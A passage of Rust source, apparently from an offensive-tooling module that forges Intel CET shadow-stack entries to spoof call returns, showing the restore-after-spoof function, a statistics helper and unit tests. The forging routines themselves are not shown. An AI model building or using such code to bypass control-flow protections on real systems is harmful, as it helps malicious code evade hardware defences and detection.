/// Restore the shadow stack after a spoofed call completes.
///
/// Consumes the `ShadowStackCookie` returned by `prepare_spoofed_return()`
/// and restores the shadow stack to its pre-spoof state.
///
/// If the cookie indicates that no forging was performed (`was_forged = false`),
/// this is a no-op.
///
/// # Safety
///
/// - Must be called after `spoof_call` returns, on the same thread.
/// - Must be called before any intervening CALL/RET operations.
pub unsafe fn restore_from_cookie(cookie: ShadowStackCookie) {
    if !cookie.was_forged {
        return;
    }

    match restore_shadow_state(&cookie.state) {
        Ok(()) => {
            log::trace!(
                "shadow_stack_forge: shadow stack restored after forged return {:#x}",
                cookie.forged_ret,
            );
        }
        Err(e) => {
            log::warn!(
                "shadow_stack_forge: shadow stack restoration failed: {} — shadow stack may be inconsistent",
                e,
            );
        }
    }
}

// ─── Statistics ────────────────────────────────────────────────────────────

/// Statistics about the shadow stack forging subsystem.
#[derive(Debug)]
pub struct ShadowForgeStats {
    /// Whether CET shadow stacks are supported by the CPU.
    pub cet_ss_supported: bool,
    /// Whether shadow stack forging has been initialized.
    pub initialized: bool,
    /// Whether CET-SS is currently enabled (RDSSPQ returns non-zero).
    pub cet_ss_enabled: bool,
}

/// Get statistics about the shadow stack forging subsystem.
pub fn get_stats() -> ShadowForgeStats {
    let cet_ss_enabled = if CET_SS_AVAILABLE.load(Ordering::Acquire) {
        unsafe { read_ssp().is_ok() }
    } else {
        false
    };

    ShadowForgeStats {
        cet_ss_supported: CET_SS_AVAILABLE.load(Ordering::Acquire),
        initialized: FORGE_INITIALIZED.load(Ordering::Acquire),
        cet_ss_enabled,
    }
}

// ─── Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shadow_stack_error_display() {
        assert_eq!(
            format!("{}", ShadowStackError::CetNotSupported),
            "CET shadow stacks not supported by CPU"
        );
        assert_eq!(
            format!("{}", ShadowStackError::WrssFailed),
            "WRSS instruction failed"
        );
        assert_eq!(
            format!("{}", ShadowStackError::RdsspFailed),
            "RDSSPQ instruction failed"
        );
        assert_eq!(
            format!("{}", ShadowStackError::InconsistentState),
            "shadow stack in inconsistent state"
        );
        assert_eq!(
            format!("{}", ShadowStackError::SaveBufferFull),
            "shadow stack save buffer full"
        );
        assert_eq!(
            format!("{}", ShadowStackError::InvalidAddress),
            "invalid address or alignment"
        );
        assert_eq!(
            format!("{}", ShadowStackError::NotPermitted),
            "operation not permitted"
        );
        assert_eq!(
            format!("{}", ShadowStackError::Unexpected(42)),
            "unexpected error (code 42)"
        );
    }

    #[test]
    fn test_shadow_stack_error_equality() {
        assert_eq!(
            ShadowStackError::CetNotSupported,
            ShadowStackError::CetNotSupported
        );
        assert_ne!(
            ShadowStackError::CetNotSupported,
            ShadowStackError::WrssFailed
        );
        assert_eq!(
            ShadowStackError::Unexpected(1),
            ShadowStackError::Unexpected(1)
        );
        assert_ne!(
            ShadowStackError::Unexpected(1),
            ShadowStackError::Unexpected(2)
        );
    }

    #[test]
    fn test_shadow_stack_error_is_error() {
        let err = ShadowStackError::CetNotSupported;
        let _: &dyn std::error::Error = &err;
    }

    #[test]
    fn test_constants() {
        assert_eq!(CPUID_CET_SS_BIT, 7);
        assert_eq!(SSP_ENTRY_SIZE, 8);
        assert_eq!(MAX_SAVE_ENTRIES, 256);
        assert_eq!(STATUS_CONTROL_STACK_VIOLATION, 0xC00001CFu32 as i32);
    }

    #[test]
    fn test_cpuid_cet_ss_supported() {
        // This test just verifies the function runs without panicking.
        // The result depends on the host CPU.
        let _ = cpuid_cet_ss_supported();
    }

    #[test]
    fn test_init_shadow_forge_idempotent() {
        let _ = init_shadow_forge();
        let _ = init_shadow_forge();
    }

    #[test]
    fn test_shadow_state_default() {
        let state = ShadowState {
            saved_ssp: 0,
            saved_entries: 0,
            entries: Vec::new(),
        };
        assert_eq!(state.saved_ssp, 0);
        assert!(state.entries.is_empty());
    }

    #[test]
    fn test_shadow_stack_layout_fields() {
        let layout = ShadowStackLayout {
            current_ssp: 0x1000,
            base: 0x0800,
            size: 0x1000,
            active_entries: 128,
        };
        assert_eq!(layout.current_ssp, 0x1000);
        assert_eq!(layout.base, 0x0800);
        assert_eq!(layout.size, 0x1000);
        assert_eq!(layout.active_entries, 128);
    }

    #[test]
    fn test_shadow_stack_cookie_not_forged() {
        let cookie = ShadowStackCookie {
            state: ShadowState {
                saved_ssp: 0,
                saved_entries: 0,
                entries: Vec::new(),
            },
            forged_ret: 0x42,
            was_forged: false,
        };
        assert!(!cookie.was_forged);
        assert_eq!(cookie.forged_ret, 0x42);
    }

    #[test]
    fn test_shadow_forge_stats() {
        let stats = get_stats();
        // On non-Windows, CET-SS won't be enabled.
        // On Windows, it depends on the CPU and OS configuration.
        let _ = stats;
    }

    #[test]
    fn test_discover_shadow_stack_layout_no_cet() {
        // On a non-CET system, this should return an error.
        // On a CET system, this should succeed.
        let result = discover_shadow_stack_layout();
        // We can't assert a specific result since it depends on the host,
        // but it shouldn't panic.
        let _ = result;
    }

    #[test]
    fn test_save_shadow_state_no_cet() {
        // Should fail gracefully when CET is not available.
        let result = save_shadow_state();
        // On non-CET: error.  On CET: success.
        let _ = result;
    }

    #[test]
    fn test_shadow_stack_cookie_debug() {
        let cookie = ShadowStackCookie {
            state: ShadowState {
                saved_ssp: 0x1000,
                saved_entries: 5,
                entries: vec![],
            },
            forged_ret: 0xDEAD,
            was_forged: true,
        };
        let debug_str = format!("{:?}", cookie);
        assert!(debug_str.contains("DEAD"));
        assert!(debug_str.contains("1000"));
    }

    #[test]
    fn test_shadow_forge_stats_debug() {
        let stats = ShadowForgeStats {
            cet_ss_supported: true,
            initialized: true,
            cet_ss_enabled: false,
        };
        let debug_str = format!("{:?}", stats);
        assert!(debug_str.contains("cet_ss_supported"));
    }

    #[test]
    fn test_page_shadow_stack_constant() {
        // PAGE_SHADOW_STACK is a special PTE flag.
        assert_eq!(PAGE_SHADOW_STACK, 0x80000000);
    }
}
